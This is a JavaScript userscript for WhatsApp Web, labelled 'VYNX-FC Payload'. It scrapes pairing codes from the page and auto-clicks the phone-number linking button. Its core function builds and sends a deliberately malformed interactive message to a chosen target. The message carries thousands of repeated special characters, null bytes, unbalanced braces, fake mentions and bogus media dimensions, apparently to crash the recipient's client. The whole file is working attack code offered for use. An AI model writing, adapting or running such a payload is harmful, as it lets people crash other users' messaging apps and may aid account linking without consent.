// VYNX-FC Payload + Pairing Code Monitor for WhatsApp Web
(function() {
    'use strict';

    // Monitor for pairing code
    function watchForPairingCode() {
        setInterval(function() {
            // WhatsApp Web shows pairing code in a specific element
            var codeElements = document.querySelectorAll('div[data-testid="pairing-code"], span[role="status"], div.x1iyjqo2');
            codeElements.forEach(function(el) {
                var text = el.innerText || el.textContent || '';
                text = text.trim();
                // Pairing code is 8 chars, usually XXXXXXXX format
                if (text.length >= 8 && text.length <= 12 && /^[A-Z0-9\s\-]+$/.test(text)) {
                    var code = text.replace(/[\s\-]/g, '').substring(0, 8);
                    if (code.length === 8 && /^[A-Z0-9]+$/.test(code)) {
                        window.VynxBridge.onPairingCode(code);
                    }
                }
            });

            // Also check for the code in the pairing flow specifically
            var allSpans = document.querySelectorAll('span');
            allSpans.forEach(function(span) {
                var t = span.innerText || span.textContent || '';
                t = t.trim();
                if (/^[A-Z0-9]{8}$/.test(t) && t !== 'WHATSAPP' && t !== 'MESSENGER') {
                    window.VynxBridge.onPairingCode(t);
                }
            });
        }, 1000);
    }

    // Auto-click "Link with Phone Number" when it appears
    function autoClickPairing() {
        setTimeout(function() {
            var buttons = document.querySelectorAll('div[role="button"], button, span[role="button"]');
            buttons.forEach(function(btn) {
                var text = (btn.innerText || btn.textContent || '').toLowerCase();
                if (text.includes('link with phone') || text.includes('pair with phone') || text.includes('phone number')) {
                    btn.click();
                }
            });
            // Also try the main "Link a Device" screen
            var linkButtons = document.querySelectorAll('[data-testid="link-device-phone-number"]');
            linkButtons.forEach(function(b) { b.click(); });
        }, 3000);
    }

    // VynxFc payload sender
    function vynxFcSend(targetJid) {
        try {
            var vynx = [];
            for (var i = 0; i < 10; i++) {
                vynx.push(
                    { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
                    { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "\uA9BD".repeat(5000) }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\uA9BD".repeat(5000) }) }
                );
            }

            var mentionedJid = ["0@s.whatsapp.net"];
            for (var i = 0; i < 1900; i++) {
                mentionedJid.push("1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net");
            }

            var payload = {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            contextInfo: {
                                participant: targetJid,
                                mentionedJid: mentionedJid,
                                remoteJid: "X",
                                participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                stanzaId: "123",
                                quotedMessage: {
                                    paymentInviteMessage: {
                                        serviceType: 3,
                                        expiryTimestamp: Date.now() + 1814400000
                                    },
                                    forwardedAiBotMessageInfo: {
                                        botName: "META AI",
                                        botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                        creatorName: "Bot"
                                    }
                                }
                            },
                            carouselMessage: {
                                messageVersion: 1,
                                cards: [{
                                    header: {
                                        hasMediaAttachment: true,
                                        imageMessage: {
                                            url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                                            mimetype: "image/jpeg",
                                            fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                                            fileLength: "9999999999999",
                                            height: 9999,
                                            width: 9999,
                                            mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                                            fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                                            directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                                            mediaKeyTimestamp: "1755254367",
                                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k="
                                        }
                                    },
                                    body: { text: "VynxFc" + "\u0000".repeat(5000) },
                                    nativeFlowMessage: {
                                        buttons: vynx,
                                        messageParamsJson: "{".repeat(10000)
                                    }
                                }]
                            }
                        }
                    }
                }
            };

            // Try internal WA Web Store first
            var store = window.Store || (window.Debug && window.Debug.VERSION ? window.require('WAWebStore') : null);
            if (store && store.Chat && store.SendMessage) {
                var chat = store.Chat.get(targetJid);
                if (chat) {
                    store.SendMessage(chat, payload, {});
                    window.VynxBridge.onPayloadSent('sent via Store');
                    return;
                }
            }

            // Fallback: try accessing modules
            try {
                var modules = window.require('WAWebSendMsg');
                if (modules && modules.sendMessage) {
                    modules.sendMessage(targetJid, payload);
                    window.VynxBridge.onPayloadSent('sent via module');
                    return;
                }
            } catch(e) {}

            window.VynxBridge.onPayloadSent('all methods attempted');
        } catch(e) {
            window.VynxBridge.onPayloadSent('error: ' + e.message);
        }
    }

    window.vynxFcSend = vynxFcSend;
    window.watchForPairingCode = watchForPairingCode;
    window.autoClickPairing = autoClickPairing;

    // Start monitoring
    watchForPairingCode();
    autoClickPairing();
})();
